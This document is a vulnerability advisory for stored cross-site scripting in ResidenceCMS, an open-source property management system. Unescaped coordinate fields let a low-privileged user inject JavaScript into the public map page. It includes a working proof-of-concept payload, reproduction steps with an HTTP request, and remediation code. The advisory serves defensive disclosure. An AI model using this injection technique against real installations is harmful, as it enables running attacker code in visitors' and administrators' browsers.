 Stored Cross-Site Scripting in the Map view (`/map`) via unescaped `latitude` / `longitude` in a JavaScript context

- **Product:** [ResidenceCMS](https://github.com/Coderberg/ResidenceCMS) (`coderberg/residence-cms`) — Open Source Property Management System built with Symfony
- **Vulnerability type:** Stored (persistent) Cross-Site Scripting — CWE-79, CWE-116
- **Vulnerable component:** `templates/property/map.html.twig`, line 41
- **Affected endpoint:** `GET /{locale}/map` (route `map_view`) — public, unauthenticated
- **Injection point:** `property[latitude]` / `property[longitude]` form fields (property create / edit)
- **Privileges required to inject:** any registered, e-mail-verified user (`ROLE_USER`)
- **Privileges required to be affected:** none — any visitor, including administrators
- **CVSS v3.1:** 5.4 (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`
- **Status:** unpatched in the latest release (v2.11.3)

---

## Summary

ResidenceCMS renders every published property's `latitude` and `longitude` directly into an inline
`<script>` block on the public "Properties on map" page, without any JavaScript-context encoding and
without any server-side validation of the stored values.

Twig's default autoescaping uses the `html` strategy, which escapes only `<`, `>`, `"`, `'` and `&`.
Inside a `<script>` element — an HTML *raw text* element — entities are never decoded, so this
escaping provides no protection whatsoever for a JavaScript context. An attacker who simply avoids
those five characters injects arbitrary JavaScript source code into the page.

Any user who can create a property listing can therefore run arbitrary JavaScript in the browser of
every visitor of `/{locale}/map`, including site administrators, in the origin of the application.
New listings are **force-published without any moderation step**, so the payload goes live the moment
it is submitted.

The account needed to exploit this is the lowest-privileged one the application has: a single
`ROLE_USER` agent account. Such accounts are the normal way the product is used — agents are given
accounts to publish their own listings. If the administrator has also enabled the
`anyone_can_register` setting (off by default, one click to turn on, and it exposes a *Register* link
in the navigation bar), the account requirement collapses to a self-service sign-up by any internet
user.

## Affected versions

The vulnerable line was introduced in this commit: https://github.com/Coderberg/ResidenceCMS/commit/53056cc384d82fceba8bd834aa0b0b0df31a7db0
("new feature. All properties on the map", 2019-09-20) and first shipped in **v1.4.2** (2019-10-14).
It is unchanged in `master` as of v2.11.3 (2025-03-01).

| Version           | Affected               |
| ----------------- | ---------------------- |
| 2.11.3 (latest)   | :x: Vulnerable         |
| 2.0.0 – 2.11.2    | :x: Vulnerable         |
| 1.4.2 – 1.x       | :x: Vulnerable         |
| < 1.4.2           | :white_check_mark: Not affected (map view did not exist) |

Verified on: ResidenceCMS v2.11.3, PHP 8.3.33, FrankenPHP/Caddy, MySQL 8, default configuration.

## Severity

### CVSS v3.1 — 5.4 (Medium)

`CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`

### CVSS v4.0 — 5.1 (Medium)

`CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N`

## Vulnerability details

### Root cause

`templates/property/map.html.twig`:

```twig
27    <script>
28        ymaps.ready(init);
29
30        function init() {
31            var myMap = new ymaps.Map("map", {
32                center: [{{ site.map_center|default('27.188534, -81.128735') }}],
33                zoom: {{ site.map_zoom|default('7') }}
34            });
35
36            {% for property in properties %}
37
38            var myGeoObject = new ymaps.GeoObject({
39                geometry: {
40                    type: "Point",
41                    coordinates: [{{ property.latitude }}, {{ property.longitude }}]   <-- injection point
42                },
```

Line 41 interpolates two user-controlled strings into JavaScript source. Twig's `html` autoescaping
strategy is applied, but:

1. It escapes only `<`, `>`, `"`, `'` and `&`.
2. `<script>` is an HTML raw-text element, so entity references inside it are never decoded — the
   escaping is therefore both useless and unnecessary in this context.
3. A payload that uses none of those five characters passes through **byte for byte**.

The correct strategy for this context is `{% autoescape 'js' %}` / `|e('js')` inside a quoted string,
or — preferably — not building JavaScript from a template at all.

### Contributing factors

| Factor | Location | Effect |
| ------ | -------- | ------ |
| No validation on the coordinate fields | `src/Entity/Traits/EntityLocationTrait.php:30-34` — `#[ORM\Column(type: Types::STRING, length: 255, nullable: true)]` with no `#[Assert\*]` constraint | Any string up to 255 characters is accepted and persisted. The PoC payload is 188 characters. |
| No HTML sanitisation of these fields | `src/Service/User/PropertyService.php:66-76` → `src/Transformer/PropertyTransformer.php:27-34` | The sanitiser only rewrites `PropertyDescription::content`; `latitude` and `longitude` are never processed. |
| Listings are published without moderation | `src/Service/Admin/PropertyService.php:36` — `$property->setState('published');` | A listing created by an ordinary user is immediately live; the `state` field is only exposed in the form to `ROLE_ADMIN` (`src/Form/Type/PropertyType.php:141` and `:158`), and the service overrides it to `published` regardless. |
| The trigger page is public | `src/Controller/PropertyController.php:40-48` — `#[Route(path: '/map', name: 'map_view', methods: ['GET'])]` rendering `PropertyRepository::findAllPublished()` | Every published property is rendered for every visitor, authenticated or not. The `show_map` flag is **not** honoured on this page. |
| No Content-Security-Policy | No CSP header is emitted anywhere in the project | Nothing constrains the injected script. |

### The payload

URL-encoded, in the `property[longitude]` form field, to the vulnerable endpoint: /en/user/property/{id}/edit
```
-80.1901250%5D%7D%7D%29%3B%7Ddocument.title%3DString.fromCharCode%2877%2C65%2C80%2C88%2C83%2C83%29%3Bfunction+init%28%29%7Bvar+myMap%3D%7BgeoObjects%3A%7Badd%3Afunction%28%29%7B%7D%7D%7D%3Bvar+myGeoObject%3Dnew+Object%28%7Bgeometry%3A%7Btype%3A1%2Ccoordinates%3A%5B0
```

Decoded value stored in `property.longitude` (188 characters, fits the `VARCHAR(255)` column):

```js
-80.1901250]}});}document.title=String.fromCharCode(77,65,80,88,83,83);function init(){var myMap={geoObjects:{add:function(){}}};var myGeoObject=new Object({geometry:{type:1,coordinates:[0
```

The payload contains **no** `<`, `>`, `"`, `'` or `&`, which is precisely why HTML escaping does not
affect it.

## Steps to reproduce

Tested against a default Docker installation of ResidenceCMS v2.11.3 reachable at
`http://localhost:8088`. Substitute your own host and locale prefix.

1. **Log in** at `http://localhost:8088/en/login` and open the listing creation form at
   `http://localhost:8088/en/user/property/new`.

2. **Fill in the mandatory fields** (title, description, category, deal type, city, address, price)
   with any values. In the *Longitude* field, paste the payload:

   ```
   -80.1901250]}});}document.title=String.fromCharCode(77,65,80,88,83,83);function init(){var myMap={geoObjects:{add:function(){}}};var myGeoObject=new Object({geometry:{type:1,coordinates:[0
   ```

   Put a normal value such as `25.775565` in *Latitude*. Leave *Show map* unchecked if you wish — the
   `/map` page ignores that flag.

   Equivalent HTTP request (the form uses the `property` block prefix; `property[_token]` is the CSRF
   token taken from the rendered form):

   ```http
   POST /en/user/property/new HTTP/1.1
   Host: localhost:8088
   Content-Type: application/x-www-form-urlencoded
   Cookie: PHPSESSID=<attacker session>

   property[latitude]=25.775565&property[longitude]=-80.1901250%5D%7D%7D%29%3B%7Ddocument.title%3DString.fromCharCode%2877%2C65%2C80%2C88%2C83%2C83%29%3Bfunction+init%28%29%7Bvar+myMap%3D%7BgeoObjects%3A%7Badd%3Afunction%28%29%7B%7D%7D%7D%3Bvar+myGeoObject%3Dnew+Object%28%7Bgeometry%3A%7Btype%3A1%2Ccoordinates%3A%5B0&property[_token]=<csrf>&...
   ```

3. **Submit the form.** The listing is saved and `PropertyService::create()` sets its state to
   `published` immediately — it is live without any review.

4. **Log out**, or use a private browsing window / a different browser with no session at all.

5. **Visit the public map page**: `http://localhost:8088/en/map`

6. **Observe the result.** The browser tab title changes to **`MAPXSS`**, proving that
   attacker-supplied JavaScript executed in the context of the application's origin for an
   unauthenticated visitor. The map itself renders normally and the JavaScript console is clean.

Any user account on the instance — and any administrator — is affected identically as soon as they
open the map page. A single malicious listing is enough; it persists until the row is removed from
the database.

## Suggested remediation

### 1. Stop generating JavaScript from user data in the template (recommended)

Build the marker collection in the controller and hand it to the client as JSON in a data attribute,
where HTML autoescaping is actually the correct and sufficient defence:

```php
// src/Controller/PropertyController.php
$markers = array_map(static fn (Property $p) => [
    'lat'   => (float) $p->getLatitude(),
    'lng'   => (float) $p->getLongitude(),
    'price' => $p->getPrice(),
    'url'   => $urlGenerator->generate('property_show', [...]),
], $repository->findAllPublished());
```

```twig
{# templates/property/map.html.twig #}
<div id="map" data-markers="{{ markers|json_encode }}"></div>
```

and read `$('#map').data('markers')` from `assets/js/map.js`, as `property/show.html.twig` already
does for the single-property map.

### 2. Minimal hot-fix for the template

If the inline script is kept, force a numeric literal. Twig's `number_format` filter casts its
argument with `(float)` (`vendor/twig/twig/src/Extension/CoreExtension.php:659`), so the output can
never be anything but a number:

```diff
--- a/templates/property/map.html.twig
+++ b/templates/property/map.html.twig
@@ -29,8 +29,8 @@
         function init() {
             var myMap = new ymaps.Map("map", {
-                center: [{{ site.map_center|default('27.188534, -81.128735') }}],
-                zoom: {{ site.map_zoom|default('7') }}
+                center: [{{ site.map_center|default('27.188534, -81.128735')|e('js') }}],
+                zoom: {{ site.map_zoom|default('7')|number_format(0, '.', '') }}
             });
 
             {% for property in properties %}
@@ -38,7 +38,7 @@
             var myGeoObject = new ymaps.GeoObject({
                 geometry: {
                     type: "Point",
-                    coordinates: [{{ property.latitude }}, {{ property.longitude }}]
+                    coordinates: [{{ property.latitude|number_format(7, '.', '') }}, {{ property.longitude|number_format(7, '.', '') }}]
                 },
```

Applied to the PoC payload, `(float)` yields `-80.190125`, so legitimate listings are unaffected
while the injected code is discarded.

Note that `|e('js')` is only safe **inside a quoted JavaScript string**; it must not be used for a
bare numeric literal, because it escapes `-` and `.` into `\x2D` / `\x2E`.

### 3. Validate the coordinates server-side (defence in depth)

```php
// src/Entity/Traits/EntityLocationTrait.php
#[ORM\Column(type: Types::STRING, length: 255, nullable: true)]
#[Assert\Regex(pattern: '/^-?\d{1,2}(\.\d{1,10})?$/', message: 'Invalid latitude.')]
private ?string $latitude = null;

#[ORM\Column(type: Types::STRING, length: 255, nullable: true)]
#[Assert\Regex(pattern: '/^-?\d{1,3}(\.\d{1,10})?$/', message: 'Invalid longitude.')]
private ?string $longitude = null;
```

Storing these as a numeric column type would be stronger still.

### 4. Ship a Content-Security-Policy

A restrictive CSP (`script-src 'self' https://api-maps.yandex.ru; object-src 'none';
base-uri 'none'`) would have contained this issue. This requires removing the inline `<script>`
blocks or nonce-ing them, which follows naturally from fix 1.

### 5. Cleaning up existing data

Installations should check for already-poisoned rows before upgrading:

```sql
SELECT id, author_id, latitude, longitude FROM property
WHERE latitude  NOT REGEXP '^-?[0-9]+(\\.[0-9]+)?$'
   OR longitude NOT REGEXP '^-?[0-9]+(\\.[0-9]+)?$';
```

## References

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') — <https://cwe.mitre.org/data/definitions/79.html>
- CWE-116: Improper Encoding or Escaping of Output — <https://cwe.mitre.org/data/definitions/116.html>
- OWASP Cross Site Scripting Prevention Cheat Sheet, Rule 3 — JavaScript contexts — <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>
- Twig documentation — `autoescape` and the `js` escaping strategy — <https://twig.symfony.com/doc/3.x/filters/escape.html>
- Symfony Security Best Practices — Escaping — <https://symfony.com/doc/current/templates.html#output-escaping>
- CVSS v3.1 Specification Document, §2.2 Scope — <https://www.first.org/cvss/v3.1/specification-document>
